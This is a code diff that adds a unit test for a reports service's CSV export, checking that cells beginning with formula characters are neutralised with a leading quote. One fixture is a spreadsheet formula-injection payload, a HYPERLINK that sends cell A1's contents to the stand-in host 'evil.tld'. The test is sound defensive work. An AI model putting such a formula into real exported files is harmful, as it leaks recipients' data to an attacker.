@@ -195,6 +195,29 @@ describe('catalog + export', () => {
     expect(csv).toContain(',,'); // the null cell
   });
 
+  it('CSV neutralizes spreadsheet formula injection in tenant-supplied values', () => {
+    // These CSVs are emailed as attachments by the scheduler, so a leading
+    // =, +, -, @, tab or CR must never reach Excel/Sheets as a live formula.
+    const csv = ReportsService.toCsv(
+      [
+        { a: '=HYPERLINK("http://evil.tld?x="&A1,"click")' },
+        { a: '+1+1' },
+        { a: '-1+1' },
+        { a: '@SUM(A1)' },
+        { a: '\tcmd' },
+        { a: 'Acme Ltd' },
+      ],
+      ['a'],
+    );
+    const rows = csv.split('\n').slice(1);
+    expect(rows[0].startsWith("\"'=HYPERLINK")).toBe(true); // quoted (has a comma) AND prefixed
+    expect(rows[1]).toBe("'+1+1");
+    expect(rows[2]).toBe("'-1+1");
+    expect(rows[3]).toBe("'@SUM(A1)");
+    expect(rows[4].startsWith("'")).toBe(true);
+    expect(rows[5]).toBe('Acme Ltd'); // ordinary values untouched
+  });
+
   it('enriches ID columns with tenant-scoped display labels from lookups', async () => {
     // hr-leave-applications declares an employeeId → Employee lookup.
     const leaveRepo = {
